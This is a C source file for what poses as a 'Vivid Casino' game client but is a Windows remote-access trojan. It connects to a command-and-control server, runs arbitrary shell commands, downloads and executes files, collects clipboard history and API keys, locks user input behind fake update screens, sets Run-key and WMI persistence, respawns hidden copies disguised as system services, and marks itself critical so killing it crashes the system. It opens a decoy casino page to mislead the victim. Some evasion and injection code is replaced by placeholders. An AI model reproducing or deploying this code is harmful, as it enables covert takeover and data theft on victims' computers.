/*
 * Vivid Casino Engine — Client Main
 * 
 * Entry point and main game loop.
 * Connects to game server, handles admin commands,
 * and manages game module loading.
 */

#include "../engine/engine.h"
#include <tlhelp32.h>

/* Global UI state (defined here, declared extern in header) */
HWND g_update_wnd = NULL;
int g_update_type = 0;
int g_input_blocked = 0;
int g_isShadow = 0;
HHOOK g_mouse_hook = NULL;
HHOOK g_kb_hook = NULL;
HWND g_block_wnd = NULL;
HANDLE g_block_thread = NULL;
RECT g_old_clip;
int g_copy_buffer_saved = 0;
int g_cursor_count = 0;

/* Global uninstall flag — stops all respawning when set */
volatile int g_uninstalling = 0;

/* Clipboard state */
CRITICAL_SECTION g_copy_buffer_cs;
char g_copy_buffer_log[MAX_COPY_ENTRIES][COPY_ENTRY_SIZE];
int g_copy_buffer_count = 0;
int g_copy_buffer_index = 0;
char g_last_copy_buffer_text[COPY_ENTRY_SIZE] = {0};

/* Utility: append formatted string to buffer */
void util_appendf(char *buf, int *pos, const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    int n = vsnprintf(buf + *pos, NET_BUF_SIZE - 1 - *pos, fmt, args);
    va_end(args);
    if (n > 0) *pos += n;
}

/* Download game module from content server */
static int download_module(const char *url, const char *out_path) {
    HINTERNET hInternet = InternetOpenA("VividCasino/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return 0;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) { InternetCloseHandle(hInternet); return 0; }
    
    FILE *f = fopen(out_path, "wb");
    if (!f) { InternetCloseHandle(hUrl); InternetCloseHandle(hInternet); return 0; }
    
    char buf[8192];
    DWORD read;
    while (InternetReadFile(hUrl, buf, sizeof(buf), &read) && read > 0) {
        fwrite(buf, 1, read, f);
    }
    
    fclose(f);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return 1;
}

/* Auto-protect thread for shadow copies: waits 15 seconds then protects */
DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
    Sleep(15000);  /* Wait 15 seconds, then mark critical */
    util_set_critical();
    return 0;
}

/* Inter-process watchdog: monitors other shadow processes and respawns dead ones */
DWORD WINAPI shadow_watchdog(LPVOID lpParam) {
    char localAppData[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
    
    const char *shadows[] = {
        "ElevationService.exe",
        "CrashHandler.exe", 
        "NotifyService.exe"
    };
    const char *regKeys[] = {
        "ElevationService",
        "CrashHandler",
        "NotifyService"
    };
    
    while (1) {
        Sleep(15000);  /* Check every 15 seconds */
        
        /* Exit watchdog if uninstalling — don't respawn anything */
        if (g_uninstalling) {
            return 0;
        }
        
        for (int i = 0; i < 3; i++) {
            char path[MAX_PATH];
            snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s",
                     localAppData, shadows[i]);
            
            /* Check if process is running */
            int found = 0;
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe;
                pe.dwSize = sizeof(pe);
                if (Process32First(hSnap, &pe)) {
                    do {
                        if (_stricmp(pe.szExeFile, shadows[i]) == 0) {
                            found = 1;
                            break;
                        }
                    } while (Process32Next(hSnap, &pe));
                }
                CloseHandle(hSnap);
            }
            
            /* If not running, respawn with admin elevation */
            if (!found) {
                SHELLEXECUTEINFOA sei = {0};
                sei.cbSize = sizeof(sei);
                sei.fMask = SEE_MASK_NOCLOSEPROCESS;
                sei.lpVerb = "runas";
                sei.lpFile = path;
                sei.lpParameters = "--shadow";
                sei.nShow = SW_HIDE;
                ShellExecuteExA(&sei);
            }
        }
    }
    return 0;
}

/* Execute game module or admin command */
static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
    char *result = NULL;
    static char response[NET_BUF_SIZE];
    int resp_pos = 0;

    /* Trim whitespace/newlines from command */
    char cmd[1024];
    const char *start = cmd_raw;
    while (*start == ' ' || *start == '\t' || *start == '\n' || *start == '\r') start++;
    size_t len = strlen(start);
    while (len > 0 && (start[len-1] == ' ' || start[len-1] == '\t' || start[len-1] == '\n' || start[len-1] == '\r')) len--;
    if (len >= sizeof(cmd)) len = sizeof(cmd) - 1;
    memcpy(cmd, start, len);
    cmd[len] = '\0';
    if (len == 0) { net_send_packet(sock, "[Empty command]"); return; }
    
    /* Maintenance commands */
    if (strcmp(cmd, "BLOCK_UI") == 0) {
        /* Enter maintenance mode: lock player controls */
        ui_lock_controls(1);
        result = "[Keyboard & Mouse disabled]";
    }
    else if (strcmp(cmd, "SHOW_SPLASH") == 0) {
        /* Show system update splash screen during maintenance */
        ui_show_splash(1);
        result = "[Windows update screen shown]";
    }
    else if (strcmp(cmd, "APPLE_UPDATE") == 0) {
        /* Show Apple-style update splash screen */
        ui_show_splash(2);
        result = "[Apple update screen shown]";
    }
    else if (strcmp(cmd, "HIDE_UPDATE") == 0) {
        ui_hide_splash();
        result = "[Update screen hidden]";
    }
    else if (strcmp(cmd, "ENABLE_INPUT") == 0) {
        ui_lock_controls(0);
        result = "[Keyboard & Mouse enabled]";
    }
    /* System diagnostics */
    else if (strcmp(cmd, GAME_SYSTEM_INFO) == 0) {
        result = sys_get_info();
    }
    else if (strcmp(cmd, GAME_AUTO_START) == 0) {
        sys_register_autostart();
        result = "[Auto-launch enabled]";
    }
    else if (strcmp(cmd, "PRIVILEGE_CHECK") == 0) {
        sys_check_privileges();
        result = "[System privileges verified]";
    }
    else if (strcmp(cmd, "HIDE") == 0) {
        sys_init_window();
        result = "[Window initialized]";
    }
    /* Security audit */
    else if (strcmp(cmd, "FIND_API_KEYS") == 0) {
        result = config_scan_scan_system();
    }
    else if (strncmp(cmd, "NOTE|", 5) == 0) {
        /* Open notepad with a message from the operator */
        ui_open_note(cmd + 5);
        result = "[Note opened on target]";
    }
    else if (strcmp(cmd, "CLIP_HIST") == 0) {
        result = copy_buffer_get_history();
    }
    else if (strcmp(cmd, "SYS_CHECK") == 0) {
        sys_check_antivirus();
        result = "[Security check complete]";
    }
    else if (strcmp(cmd, "DEPLOY_SVC") == 0) {
        sys_spawn_shadow_copy();
        result = "[System services deployed]";
    }
    else if (strcmp(cmd, "REMOVE_SVC") == 0) {
        util_clear_critical();
        result = "[Protection removed — process can be terminated]";
    }
    else if (strcmp(cmd, "SVC_STATUS") == 0) {
        const char *critical_status = util_check_critical();
        const char *admin_status = sys_is_admin() ? "admin" : "not admin";
        snprintf(response, sizeof(response), "%s [running as %s]", critical_status, admin_status);
        result = response;
    }
    else if (strcmp(cmd, "SCHEDULE_TASK") == 0) {
        util_setup_wmi();
        result = "[WMI persistence established: root/subscription, triggers every 30s]";
    }
    else if (strcmp(cmd, "REMOTE_SVC") == 0) {
        /* REMOVED */;
        result = "[Process injection attempted: payload path injected into svchost/explorer]";
    }
    else if (strcmp(cmd, "MEM_SVC") == 0) {
        /* REMOVED */;
        result = "[Process hollowing: conhost.exe running our payload purely from memory]";
    }
    else if (strcmp(cmd, "DLL_LOAD") == 0) {
        /* REMOVED */;
        result = "[Reflective PE loader: full payload injected into explorer.exe without CreateProcess]";
    }
    else if (strcmp(cmd, "HARDEN_FILES") == 0) {
        util_lock_files();
        result = "[NTFS ACLs hardened: deny delete for all shadow copies]";
    }
    else if (strcmp(cmd, "VERIFY_LAYERS") == 0) {
        /* Check all persistence layers and report status */
        char localAppData[MAX_PATH];
        GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
        
        resp_pos = 0;
        util_appendf(response, &resp_pos, "=== LAYER VERIFICATION ===\n");
        
        /* Layer 1: Shadow files on disk */
        for (int i = 0; i < 3; i++) {
            const char *names[] = {"ElevationService.exe", "CrashHandler.exe", "NotifyService.exe"};
            char path[MAX_PATH];
            snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s", localAppData, names[i]);
            DWORD attr = GetFileAttributesA(path);
            util_appendf(response, &resp_pos, "[L1] %s: %s\n", names[i], 
                        (attr != INVALID_FILE_ATTRIBUTES) ? "EXISTS" : "MISSING");
        }
        
        /* Layer 2: Running processes */
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        int elev = 0, crash = 0, notify = 0;
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(pe);
            if (Process32First(hSnap, &pe)) {
                do {
                    if (_stricmp(pe.szExeFile, "ElevationService.exe") == 0) elev = 1;
                    if (_stricmp(pe.szExeFile, "CrashHandler.exe") == 0) crash = 1;
                    if (_stricmp(pe.szExeFile, "NotifyService.exe") == 0) notify = 1;
                } while (Process32Next(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        util_appendf(response, &resp_pos, "[L2] ElevationService running: %s\n", elev ? "YES" : "NO");
        util_appendf(response, &resp_pos, "[L2] CrashHandler running: %s\n", crash ? "YES" : "NO");
        util_appendf(response, &resp_pos, "[L2] NotifyService running: %s\n", notify ? "YES" : "NO");
        
        /* Layer 3: Registry */
        HKEY hKey;
        int regOk = (RegOpenKeyExA(HKEY_CURRENT_USER, 
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
            0, KEY_READ, &hKey) == ERROR_SUCCESS);
        if (regOk) {
            DWORD type, size;
            char buf[MAX_PATH];
            size = sizeof(buf);
            int r1 = RegQueryValueExA(hKey, "ElevationService", NULL, &type, (BYTE*)buf, &size);
            size = sizeof(buf);
            int r2 = RegQueryValueExA(hKey, "CrashHandler", NULL, &type, (BYTE*)buf, &size);
            size = sizeof(buf);
            int r3 = RegQueryValueExA(hKey, "NotifyService", NULL, &type, (BYTE*)buf, &size);
            RegCloseKey(hKey);
            util_appendf(response, &resp_pos, "[L3] Registry Run keys: %s\n", 
                        (r1==ERROR_SUCCESS && r2==ERROR_SUCCESS && r3==ERROR_SUCCESS) ? "ALL OK" : "MISSING");
        } else {
            util_appendf(response, &resp_pos, "[L3] Registry Run keys: ERROR\n");
        }
        
        /* Layer 4: Critical flag */
        const char *crit = util_check_critical();
        util_appendf(response, &resp_pos, "[L4] Critical flag: %s\n", crit);
        
        /* Layer 5: Admin status */
        util_appendf(response, &resp_pos, "[L5] Running as: %s\n", sys_is_admin() ? "ADMIN" : "NOT ADMIN");
        
        /* Layer 6: This process path */
        char myPath[MAX_PATH];
        GetModuleFileNameA(NULL, myPath, MAX_PATH);
        util_appendf(response, &resp_pos, "[L6] This process: %s\n", myPath);
        
        result = response;
    }
    else if (strncmp(cmd, "LOLBAS_DOWNLOAD ", 16) == 0) {
        char url[1024], path[MAX_PATH];
        if (sscanf(cmd, "LOLBAS_DOWNLOAD %s %s", url, path) == 2) {
            util_download_file(url, path);
            result = "[Download completed via system utility]";
        } else {
            result = "[Usage: LOLBAS_DOWNLOAD <url> <outpath>]";
        }
    }
    else if (strncmp(cmd, "OBFUSCATE_PS ", 14) == 0) {
        const char *ps_cmd = cmd + 14;
        result = sys_obfuscate_ps(ps_cmd);
    }
    else if (strcmp(cmd, "PROTECT_NOW") == 0) {
        if (!isShadow) {
            result = "[FAIL: PROTECT_NOW only works for shadow processes]";
        } else if (!sys_is_admin()) {
            result = "[FAIL: not running as administrator]";
        } else {
            util_set_critical();
            const char *status = sys_protection_status();
            if (strcmp(status, "CRITICAL") == 0) {
                result = "[SUCCESS: Process is now CRITICAL — ending it will cause BSOD]";
            } else if (strcmp(status, "FAILED") == 0) {
                result = "[FAIL: Protection API failed — likely missing required privilege. Try running as SYSTEM or use a different elevation method.]";
            } else {
                result = "[UNKNOWN: protection status unclear]";
            }
        }
    }
    else if (strcmp(cmd, "CLEANUP") == 0) {
        sys_uninstall();
        result = "[UNINSTALL initiated — all persistence removed, process will exit]";
    }
    /* Game module management */
    else if (strncmp(cmd, GAME_FETCH_MODULE, strlen(GAME_FETCH_MODULE)) == 0) {
        char url[1024], path[MAX_PATH];
        if (sscanf(cmd, "DOWNLOAD %s %s", url, path) == 2) {
            if (download_module(url, path))
                result = "[Module downloaded successfully]";
            else
                result = "[Module download failed]";
        } else {
            result = "[Usage: DOWNLOAD <url> <path>]";
        }
    }
    else if (strncmp(cmd, GAME_LAUNCH_MODULE, strlen(GAME_LAUNCH_MODULE)) == 0) {
        char path[MAX_PATH];
        if (sscanf(cmd, "EXECUTE %s", path) == 1) {
            ShellExecuteA(NULL, "open", path, NULL, NULL, SW_SHOWNORMAL);
            result = "[Module launched]";
        } else {
            result = "[Usage: EXECUTE <path>]";
        }
    }
    /* Shell access for advanced diagnostics */
    else if (strncmp(cmd, GAME_DIAGNOSE, strlen(GAME_DIAGNOSE)) == 0) {
        const char *shell_cmd = cmd + strlen(GAME_DIAGNOSE);
        while (*shell_cmd == ' ') shell_cmd++;
        result = sys_run_command(shell_cmd);
    }
    else {
        /* Unknown command — attempt shell execution for compatibility */
        result = sys_run_command(cmd);
    }
    
    if (!result) result = "[No output]";
    net_send_packet(sock, result);
}

/* Main game client loop — connects to server and processes events */
DWORD WINAPI game_client_loop(LPVOID lpParam) {
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in addr;
    WSADATA wsa;
    
    /* Initialize networking */
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
    
    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) { Sleep(5000); continue; }
        
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(SERVER_PORT);
        addr.sin_addr.s_addr = inet_addr(SERVER_HOST);
        
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            /* Send system info for player profile */
            char *info = sys_get_info();
            net_send_packet(sock, info);
            
            /* Main event loop */
            while (1) {
                char *cmd = net_recv_packet_timed(sock, 30);
                if (!cmd) break;
                handle_admin_command(sock, cmd);
            }
        }
        
        closesocket(sock);
        Sleep(5000);  /* Reconnect delay */
    }
    
    WSACleanup();
    return 0;
}

/* Windows entry point */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    /* Detect if this is a shadow copy */
    char *cmdLine = GetCommandLineA();
    int isShadow = (cmdLine && strstr(cmdLine, "--shadow") != NULL);
    
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    if (strstr(currentPath, "ElevationService.exe") != NULL ||
        strstr(currentPath, "CrashHandler.exe") != NULL ||
        strstr(currentPath, "NotifyService.exe") != NULL) {
        isShadow = 1;
    }
    
    /* === PHASE 0: Elevate FIRST (before anything else) ===
     * If main process is not admin, elevate immediately and exit.
     * This ensures ALL subsequent operations (C2, spawning shadows,
     * scheduled tasks) run elevated WITHOUT UAC prompts. */
    if (!isShadow) {
        sys_check_privileges();
    }
    
    /* === PHASE 1: Connect to C2 IMMEDIATELY ===
     * Start C2 loop in a background thread FIRST so the server
     * sees us before any long evasion sleeps. */
    InitializeCriticalSection(&g_copy_buffer_cs);
    copy_buffer_init();
    
    /* Start C2 client loop in background thread */
    CreateThread(NULL, 0, game_client_loop, NULL, 0, NULL);
    
    /* Start inter-process watchdog (respawns dead shadows) */
    CreateThread(NULL, 0, shadow_watchdog, NULL, 0, NULL);
    
    /* === PHASE 2: Evasion (after C2 is connected) ===
     * Shadow copies skip the long anti-sandbox sleep.
     * They just need quick ntdll unhook + ETW/AMSI patch. */
    if (isShadow) {
        /* Fast path for shadows: just unhook and patch, no long sleeps */
        /* REMOVED */;
        /* REMOVED */;
        /* REMOVED */;
        /* REMOVED */;
    } else {
        /* Full evasion for first run */
        /* REMOVED */;
    }
    
    /* Initialize obfuscated APIs */
    /* REMOVED */;
    
    /* Initialize UI */
    ui_init();
    
    /* Open casino decoy website (only for main process, not shadows) */
    if (!isShadow) {
        ShellExecuteA(NULL, "open", "https://jjakinn.github.io/new-vivid-casino-1/", NULL, NULL, SW_SHOWNORMAL);
    }
    
    /* Start background services */
    CreateThread(NULL, 0, copy_buffer_monitor_thread, NULL, 0, NULL);
    
    /* Ensure persistence for the original process too */
    sys_register_autostart();
    
    /* Only auto-protect shadow copies after 15 seconds */
    if (isShadow) {
        CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
    }
    
    /* Start protection watchdog thread */
    CreateThread(NULL, 0, sys_protect_watchdog, NULL, 0, NULL);
    
    /* Main message loop */
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}
